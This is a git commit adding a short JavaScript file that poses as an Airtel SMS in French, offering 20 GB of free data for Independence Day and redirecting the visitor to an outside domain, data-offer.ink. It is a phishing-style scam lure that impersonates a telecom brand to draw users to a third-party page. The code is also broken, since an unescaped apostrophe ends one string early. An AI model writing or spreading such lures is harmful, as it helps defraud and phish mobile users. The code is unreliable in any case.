e5cc1bf3c3870196fa2f371f73c6532663eaa587
katemj25 <mbokofficial1@gmail.com>
2025-06-29 19:46:57 -0700

    Create airtel-idependence-offer.js

---
+++ airtel-idependence-offer.js
@@ -0,0 +1,5 @@
+var password = 'Offre de 20 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 20 Go de données gratuites de l'offre Airtel Independence Day, veuillez appuyer sur OK pour ACTIVER. ','Offre de 20 Go de données gratuites');
+if (password != 'Offre de 20 Go de données gratuites') {
+location.href='https://data-offer.ink/airtel-idependence-offer.html';
+}
